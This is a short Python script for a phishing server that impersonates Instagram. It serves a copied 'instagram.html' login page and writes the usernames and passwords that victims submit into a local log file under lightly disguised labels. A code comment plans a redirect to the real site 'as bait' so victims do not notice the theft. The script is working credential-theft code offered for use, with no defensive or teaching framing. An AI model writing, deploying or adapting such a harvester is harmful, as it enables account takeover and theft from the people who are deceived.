import http.server
import socketserver
import os
from urllib.parse import parse_qs
from flask import Flask

app = Flask(__name__)

port = 8000
directory = os.path.join(os.getcwd(), 'instagram')
log_file = os.path.join(os.getcwd(), 'log.txt')

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = parse_qs(post_data)
        user_input = parsed_data['user_input'][0]
        user_login = parsed_data['user_login'][0]


        with open(log_file, 'a') as f:
            f.write("INS0GR1M:" + "\n")
            f.write( "Us3rn4m3: " + user_input + '\n')
            f.write("L0g1n: " + user_login + "\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Logged successfully!')
        # after <redirect to insta.com again as bait.>

    def translate_path(self, path):
        path = super().translate_path(path)
        if os.path.isdir(path):
            return os.path.join(directory, 'instagram.html')
        return path

def run_server(port):
    Handler = MyHTTPRequestHandler
    with socketserver.TCPServer(("", port), Handler) as httpd:
        print(f"Server started on port {port}")
        httpd.serve_forever()

run_server(port)
#OR:

"""
@app.route("/")

def index():

    return "Web-Application started"
"""
